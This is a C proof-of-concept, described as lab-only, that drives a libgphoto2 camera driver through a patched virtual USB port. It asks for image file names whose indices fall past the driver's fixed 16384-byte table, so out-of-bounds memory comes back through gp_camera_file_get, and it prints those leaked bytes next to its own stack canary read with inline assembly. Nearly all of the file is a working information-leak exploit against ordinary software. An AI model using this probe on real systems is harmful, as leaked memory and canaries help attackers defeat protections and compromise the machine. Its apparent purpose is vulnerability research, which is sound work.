/* W177 lab-only replay probe: real libgphoto2 API, short canary-safe vusb
 * reply, numeric jl_%03i.ppm names. Prints the 16 raw bytes returned by
 * gp_camera_file_get(GP_FILE_TYPE_RAW), i.e. priv->table + 16*(name-1),
 * including indices >= 1024 which are past the fixed 16384-byte table.
 * Usage: probe usb:001,001 <first-name-number> <last-name-number> */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>

void *m2s_victim_file;            /* looked up by the patched vusb port */

int main(int argc, char **argv)
{
	Camera *cam = NULL;
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	CameraList *list = NULL;
	CameraFile *file = NULL;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	int lo = argc > 2 ? atoi(argv[2]) : 1024;
	int hi = argc > 3 ? atoi(argv[3]) : 1025;
	char namebuf[32];
	const char *name = NULL, *data = NULL;
	unsigned long size = 0, own = 0;
	int m, idx, rc, n = 0, i, k;

	__asm__ volatile("mov %%fs:0x28, %0" : "=r"(own));
	printf("OWN_CANARY=%016lx\n", own);

	if (gp_camera_new(&cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, path);
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(cam, pi) < GP_OK) return 2;

	rc = gp_camera_init(cam, NULL);
	printf("gp_camera_init rc=%d\n", rc);
	if (rc < GP_OK) return 3;

	if (gp_list_new(&list) < GP_OK) return 2;
	rc = gp_camera_folder_list_files(cam, "/", list, NULL);
	printf("list_files rc=%d count=%d\n", rc, gp_list_count(list));
	n = gp_list_count(list);
	if (n > 0) {
		gp_list_get_name(list, 0, &name);
		printf("first name=%s\n", name);
		gp_list_get_name(list, n - 1, &name);
		printf("last name=%s\n", name);
	}

	if (gp_file_new(&file) < GP_OK) return 2;
	for (k = lo; k <= hi; k++) {
		snprintf(namebuf, sizeof(namebuf), "jl_%03i.ppm", k);
		name = namebuf;
		rc = gp_camera_file_get(cam, "/", name, GP_FILE_TYPE_RAW,
					file, NULL);
		printf("file=%s table_k=%d rc=%d", name, k - 1, rc);
		if (rc == GP_OK) {
			gp_file_get_data_and_size(file, &data, &size);
			printf(" size=%lu data=", size);
			for (i = 0; i < 16 && i < (int)size; i++)
				printf("%02x", (unsigned char)data[i]);
		}
		printf("\n");
	}
	gp_file_free(file);
	gp_list_free(list);
	return 0;
}
